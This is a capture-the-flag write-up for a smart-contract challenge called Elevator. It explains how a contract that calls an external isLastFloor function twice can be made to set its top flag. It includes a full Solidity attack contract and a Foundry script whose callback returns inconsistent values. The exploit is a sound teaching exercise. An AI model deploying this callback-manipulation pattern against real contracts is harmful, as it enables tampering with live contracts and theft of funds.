# Elevator   
Our mission is to set the `top` variable to `true` in the `Elevator` contract.  
The Elevator contract has an interesting vulnerability in its `goTo` function. Let's analyze how it works:

The contract calls `isLastFloor` twice in the `goTo` function. It expects the caller to implement the Building interface
Most importantly, there's no protection against the `isLastFloor`  function returning different values for the same input.

The key insight is that even though `isLastFloor` should logically return the same value for the same floor number, there's nothing in the code enforcing this. We can exploit this by making our implementation return different values on consecutive calls.
We need to create a malicious contract that implements the Building interface. Our implementation of isLastFloor will:

1. First return false to pass the initial check
2. Then return true to set the top variable

Here's the complete solution with the attack contract and automation script:
 
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    Attack attack;

    function run() public {
        vm.startBroadcast();
        attack = new Attack( /* Your instance address */ );
        attack.solve();
        vm.stopBroadcast();
    }
}

contract Attack {
    bool top;
    address private immutable i_instance;

    constructor(address instance) {
        i_instance = instance;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool aux = top;
        top = !top; // Switches the value of top.
        return aux;
    }

    function solve() external {
     i_instance.call(abi.encodeWithSignature("goTo(uint256)", 1));
    }
}
```
